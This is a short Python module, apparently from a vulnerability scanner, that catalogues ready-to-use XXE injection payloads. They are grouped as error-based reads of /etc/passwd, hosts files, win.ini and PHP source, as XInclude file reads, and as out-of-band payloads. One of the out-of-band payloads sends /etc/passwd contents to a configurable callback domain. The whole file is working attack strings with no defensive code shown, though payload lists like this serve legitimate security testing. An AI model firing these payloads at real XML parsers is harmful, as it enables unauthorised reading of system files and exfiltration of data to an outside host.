from dataclasses import dataclass


@dataclass
class XxePayload:
    value: str
    technique: str
    description: str


ERROR_BASED_PAYLOADS: list[XxePayload] = [
    XxePayload(
        '<!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><root>&xxe;</root>',
        "error",
        "Unix /etc/passwd via direct entity",
    ),
    XxePayload(
        '<!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/hosts">]><root>&xxe;</root>',
        "error",
        "Unix /etc/hosts via direct entity",
    ),
    XxePayload(
        '<!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///c:/windows/win.ini">]><root>&xxe;</root>',
        "error",
        "Windows win.ini via direct entity",
    ),
    XxePayload(
        '<!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///c:/windows/system32/drivers/etc/hosts">]><root>&xxe;</root>',
        "error",
        "Windows hosts via direct entity",
    ),
    XxePayload(
        '<!DOCTYPE foo [<!ENTITY % xxe SYSTEM "file:///etc/passwd">%xxe;]><root/>',
        "error",
        "Unix /etc/passwd via parameter entity",
    ),
    XxePayload(
        '<!DOCTYPE foo [<!ENTITY xxe SYSTEM "php://filter/read=convert.base64-encode/resource=index.php">]><root>&xxe;</root>',
        "error",
        "PHP filter base64 index.php",
    ),
]

OOB_PAYLOADS: list[XxePayload] = [
    XxePayload(
        '<!DOCTYPE foo [<!ENTITY xxe SYSTEM "{OOB_DOMAIN}/xxe-oob">]><root>&xxe;</root>',
        "oob",
        "OOB HTTP exfiltration via direct entity",
    ),
    XxePayload(
        '<!DOCTYPE foo [<!ENTITY % xxe SYSTEM "{OOB_DOMAIN}/xxe-oob">%xxe;]><root/>',
        "oob",
        "OOB HTTP exfiltration via parameter entity",
    ),
    XxePayload(
        '<!DOCTYPE foo [<!ENTITY % xxe SYSTEM "file:///etc/passwd"><!ENTITY callhome SYSTEM "{OOB_DOMAIN}/xxe-data?data=%xxe;">]><root>&callhome;</root>',
        "oob",
        "OOB data exfiltration via parameter entity + call home",
    ),
    XxePayload(
        '<xi:include xmlns:xi="http://www.w3.org/2001/XInclude" href="{OOB_DOMAIN}/xxe-xinclude"/>',
        "oob",
        "OOB via XInclude when DOCTYPE is blocked",
    ),
]

XINCLUDE_PAYLOADS: list[XxePayload] = [
    XxePayload(
        '<xi:include xmlns:xi="http://www.w3.org/2001/XInclude" href="file:///etc/passwd" parse="text"/>',
        "xinclude",
        "XInclude Unix /etc/passwd",
    ),
    XxePayload(
        '<xi:include xmlns:xi="http://www.w3.org/2001/XInclude" href="file:///c:/windows/win.ini" parse="text"/>',
        "xinclude",
        "XInclude Windows win.ini",
    ),
]


def get_error_payloads() -> list[XxePayload]:
    return ERROR_BASED_PAYLOADS


def get_oob_payloads(oob_domain: str) -> list[XxePayload]:
    result: list[XxePayload] = []
    for p in OOB_PAYLOADS:
        result.append(
            XxePayload(
                value=p.value.replace("{OOB_DOMAIN}", oob_domain),
                technique=p.technique,
                description=p.description,
            )
        )
    return result


def get_xinclude_payloads() -> list[XxePayload]:
    return XINCLUDE_PAYLOADS
